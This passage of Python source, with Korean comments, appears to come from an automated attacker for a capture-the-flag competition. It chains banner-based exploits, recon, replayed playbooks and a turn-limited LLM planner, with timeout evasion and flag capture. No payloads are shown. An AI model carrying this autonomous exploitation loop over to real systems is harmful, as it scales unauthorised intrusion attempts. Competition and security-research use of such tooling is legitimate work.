        # root 배너가 취약 부류를 직접 노출하면 정찰 sweep보다 먼저 zero-token 공격한다.
        root_hints = suggest_vuln_classes(banner)
        if root_hints != [VulnClass.OTHER]:
            captured_any = self._deterministic_exploit(
                endpoint, banner, banner_fp, resp.headers, current_evidence,
                attempted_keys=attempted_keys,
                observed_only=observed_only) or captured_any
        if self._stop_event.is_set():
            return captured_any
        current_evidence = self._latest_evidence(endpoint, current_evidence)

        # L4/UGV를 포함한 미지 인터페이스는 실제 probe 응답에서 route를 발견한 뒤에만 공격한다.
        captured, discovery, current_evidence = self._recon(
            endpoint, current_evidence, discovery_only=observed_only
        )
        captured_any = captured or captured_any
        if self._stop_event.is_set():
            return captured_any
        observed_banner = "\n".join(part for part in (banner, discovery) if part)

        # 결정론적 exploit 엔진 — 관측된 route·parameter를 우선해 LLM 전에 실행한다.
        captured_any = self._deterministic_exploit(
            endpoint, observed_banner, banner_fp, resp.headers, current_evidence,
            attempted_keys=attempted_keys,
            observed_only=observed_only) or captured_any
        if self._stop_event.is_set():
            return captured_any
        current_evidence = self._latest_evidence(endpoint, current_evidence)

        # 한 서비스에 flag가 여러 개일 수 있으므로 결정론·recon 경로는 모두 돈다.
        # 이미 하나 이상 회수했다면 비용성 LLM 단계만 생략한다.
        if captured_any:
            return True

        # playbook 재사용은 LLM보다 먼저 시도한다.
        tried_reuse = False
        while not self._stop_event.is_set():
            known = self._playbook.lookup(banner_fp)
            if known:
                result, captured = self._run_bound_exploit(
                    endpoint, known, current_evidence, "playbook")
                tried_reuse = True
                if captured:
                    if result is not None:
                        self._playbook.record(banner_fp, result.plan.args)
                    self.audit.log("hit", target=endpoint.key(),
                                   path=(result.plan.args.get("path") if result is not None
                                         else known.get("path")), reason="playbook")
                    captured_any = True
                    break
                if result is not None:
                    current_evidence = result.observation.evidence_ref
            slot = self._playbook.claim_or_wait(
                banner_fp,
                tried_reuse=tried_reuse,
                stop_event=self._stop_event,
            )
            if self._stop_event.is_set():
                return captured_any
            if slot == "reuse":
                continue
            break

        return self._advise_llm_on_endpoint(
            endpoint,
            banner=observed_banner,
            banner_fp=banner_fp,
            evidence_ref=current_evidence,
            already_captured=captured_any,
        ) or captured_any

    def _advise_llm_on_endpoint(self, endpoint, banner: str, banner_fp: str,
                                evidence_ref, already_captured: bool = False) -> bool:
        """Use a bounded low-cost LLM fallback only after deterministic misses."""
        if self._planner is None or getattr(self._planner._advisor, "_key_handle", None) is None:
            self.audit.log(
                "llm-skip", target=endpoint.key(),
                reason="no-llm-key",
            )
            return already_captured

        captured_any = already_captured
        current_evidence = evidence_ref
        # 관측 evidence가 없으면 banner 관측으로 확보(gRPC 합성 경로).
        if current_evidence is None or not current_evidence.valid_at(
                self.clock(), self._round_id, endpoint.endpoint_id):
            try:
                obs, resp = self._observer.observe_banner(endpoint)
                self._report.record_observation()
                self._report.record_request()
                self._remember_evidence(endpoint, obs.evidence_ref)
                current_evidence = obs.evidence_ref
                if self._process_flags(resp.body, resp.headers):
                    captured_any = True
            except Exception:
                current_evidence = evidence_ref

        llm_turn_limit = min(MAX_TURNS, MAX_LLM_TURNS_PER_ENDPOINT)
        state = EndpointState(endpoint)
        feedback = ""
        try:
            while (not self._stop_event.is_set()
                   and state.turn < llm_turn_limit):
                state.turn += 1
                plan = self._planner.plan_next(endpoint, banner, feedback, state,
                                               model=self.config.llm_model)
                if plan is None:
                    self.audit.log(
                        "llm-skip", target=endpoint.key(), turn=state.turn,
                        reason="advise-empty-or-failed",
                        model=self.config.llm_model,
                    )
                    break
                self.audit.log(
                    "llm-plan", target=endpoint.key(), turn=state.turn,
                    path=plan.args.get("path"), model=self.config.llm_model,
                    reason=plan.reason or "",
                )
                if current_evidence is None:
                    # evidence 없이 bind하면 거절 — 조언 호출만으로도 크레딧은 이미 소모됨.
                    feedback = "No bound evidence yet; suggest another read-only path."
                    continue
                self._bind_plan(plan, endpoint, current_evidence)
                result = None
                try:
                    result = self._adapter.execute(plan)
                except PlanBindingError as exc:
                    binding_reason = self._binding_reason(exc)
                    if binding_reason != "evidence-stale-or-missing":
                        self.audit.log("reject", target=endpoint.key(), turn=state.turn,
                                       reason=binding_reason)
                        feedback = f"Plan rejected: {binding_reason}. Try a different path."
                        continue
                    refresh_obs, refresh_resp = self._observer.observe_banner(endpoint)
                    self._report.record_observation()
                    self._report.record_request()
                    self._remember_evidence(endpoint, refresh_obs.evidence_ref)
                    if self._process_flags(refresh_resp.body, refresh_resp.headers):
                        self.audit.log("hit", target=endpoint.key(), turn=state.turn,
                                       path="/", reason="evidence-refresh")
                        captured_any = True
                    current_evidence = refresh_obs.evidence_ref
                    self._bind_plan(plan, endpoint, current_evidence)
                    try:
                        result = self._adapter.execute(plan)
                    except (PlanBindingError, EgressError) as retry_exc:
                        self.audit.log(
                            "reject", target=endpoint.key(), turn=state.turn,
                            reason=(self._binding_reason(retry_exc)
                                    if isinstance(retry_exc, PlanBindingError)
                                    else type(retry_exc).__name__),
                        )
                        feedback = "Retry after evidence refresh failed. Propose another exploit."
                        continue
                except EgressError as exc:
                    self.audit.log("reject", target=endpoint.key(), turn=state.turn,
                                   reason=type(exc).__name__)
                    feedback = f"Egress error {type(exc).__name__}. Propose another exploit."
                    continue
                if result is None:
                    continue

                self._report.record_request()
                self._remember_evidence(endpoint, result.observation.evidence_ref)

                if self._process_flags(result.body, result.observation.redacted_header_hints):
                    self._playbook.record(banner_fp, plan.args)
                    self.audit.log("hit", target=endpoint.key(), turn=state.turn,
                                   path=plan.args["path"], vuln=str(plan.scenario),
                                   reason=plan.reason)
                    captured_any = True
                    break

                current_evidence = result.observation.evidence_ref
                if result.outcome == Outcome.TIMEOUT:
                    state.no_response_streak += 1
                    evaded, captured = self._try_evasion(plan, current_evidence)
                    if captured:
                        self._playbook.record(banner_fp, evaded.plan.args)
                        self.audit.log("hit", target=endpoint.key(), turn=state.turn,
                                       path=evaded.plan.args["path"], reason="evasion")
                        captured_any = True
                        result = evaded
                        current_evidence = evaded.observation.evidence_ref
                    elif evaded is not None:
                        result = evaded
                        current_evidence = evaded.observation.evidence_ref
                else:
                    state.no_response_streak = 0

                feedback = self._feedback(plan, result)
        finally:
            self._playbook.finish_llm(banner_fp)

        return captured_any

    # ---- 라운드 루프 ----

    def _attack_isolated(self, endpoint) -> None:
        if self._stop_event.is_set():
            return
        key = endpoint.endpoint_id
        now = self.clock()
        with self._state_lock:
            if key in self._completed_endpoints:
                return
            next_attempt, seen_generation = self._endpoint_retry_state.get(key, (0.0, -1))
        generation = self._playbook.generation
        if now < next_attempt and generation <= seen_generation:
            self.audit.log(
                "endpoint-deferred",
                target=endpoint.key(),
                reason="cooldown",
                remaining_seconds=round(next_attempt - now, 3),
                playbook_generation=generation,
                seen_generation=seen_generation,
            )
            return
        if now < next_attempt and generation > seen_generation:
            self.audit.log(
                "endpoint-retry-released",
                target=endpoint.key(),
                reason="new-playbook-generation",
                playbook_generation=generation,
                seen_generation=seen_generation,
            )
        captured = False
        stop_reason = "no-accepted-flag"
        try:
            captured = self.attack_endpoint(endpoint)
        except Exception as exc:  # 표적 단위 격리
            stop_reason = type(exc).__name__
            self.audit.log("error", target=endpoint.key(), error=type(exc).__name__)
        finally:
            scheduled = None
            with self._state_lock:
                if captured:
                    self._completed_endpoints.add(key)
                    self._endpoint_retry_state.pop(key, None)
                elif self._stop_event.is_set():
                    self._endpoint_retry_state.pop(key, None)
                else:
                    generation = self._playbook.generation
                    responsive = key in self._responsive_endpoints
                    cooldown = (
                        ENDPOINT_RETRY_COOLDOWN
                        if responsive
                        else BOOTSTRAP_RETRY_COOLDOWN
                    )
                    self._endpoint_retry_state[key] = (
                        self.clock() + cooldown,
                        generation,
                    )
                    scheduled = generation
                    scheduled_cooldown = cooldown
            if scheduled is not None:
                self.audit.log(
                    "endpoint-retry-scheduled",
                    target=endpoint.key(),
                    reason=(stop_reason if scheduled_cooldown == ENDPOINT_RETRY_COOLDOWN
                            else "bootstrap-no-response"),
                    cooldown_seconds=scheduled_cooldown,
                    playbook_generation=scheduled,
                )

    def run_cycle(self) -> RoundReport:
        """열린 Round에서 엔드포인트 전체를 한 번 공격한다(병렬, 전역 rate limit 공유).

        concurrency<=1 이거나 표적이 1개면 결정론적 순차 경로를 쓴다.
        """
        if not self._round_active:
            raise RuntimeError("start_round() must be called before run_cycle()")
        endpoints = cumulative_endpoint_order(self.config.endpoints())
        workers = min(self.config.concurrency, max(1, len(endpoints)))
        if workers <= 1:
            # 순차(결정론) — 공정 스케줄러로 순회
            sched = FairScheduler(endpoints, per_target_budget=PER_TARGET_BUDGET)
            while not self._stop_event.is_set():
                endpoint = sched.next()
                if endpoint is None:
                    break
                sched.charge(endpoint)
                self._attack_isolated(endpoint)
        else:
            # 병렬 — 표적별 스레드가 전역 rate limit·공유 상태(락)를 공유
            with ThreadPoolExecutor(max_workers=workers) as pool:
                for fut in [pool.submit(self._attack_isolated, e) for e in endpoints
                            if not self._stop_event.is_set()]:
                    fut.result()
        return self._report

    def run_once(self) -> RoundReport:
        """독립된 한 Round를 열고 한 번의 scan cycle을 실행한다."""
        if self._round_active:
            raise RuntimeError("run_once() cannot run during an active Round")
        self.start_round()
        try:
            return self.run_cycle()
        finally:
            self.finish_round()

    def run_forever(self, max_cycles=None) -> None:
        self.audit.log(
            "startup",
            targets=len(self.config.targets),
            ports=len(self.config.ports),
            can_attack=self.config.can_attack,
            can_submit=self.config.can_submit,
            model=self.config.llm_model,
            attack_profile=ATTACK_PROFILE,
            version=ATTACKER_VERSION,
            llm_cap=MAX_LLM_CALLS_PER_ROUND,
            has_llm_key=bool(self.config.llm_api_key),
        )
        if not self.config.can_attack:
            self.audit.log("inert", reason="표적 없음 — fail-open, 공격 없음")
            return
        if not self.config.can_submit:
            self.audit.log("warn", reason="제출 설정 없음 — flag 획득해도 제출 불가")
        self.start_round()
        try:
            cycles = 0
            while ((max_cycles is None or cycles < max_cycles)
                   and self.clock() < self._round_deadline
                   and not self._stop_event.is_set()):
                report = self.run_cycle()
                self.audit.log("round-summary", **report.summary())
                cycles += 1
                cycles_remaining = max_cycles is None or cycles < max_cycles
                remaining = self._round_deadline - self.clock()
                if (cycles_remaining and remaining > 0
                        and not self._stop_event.is_set()):
                    self.sleep(min(LOOP_SLEEP, remaining))
        finally:
            self.finish_round()
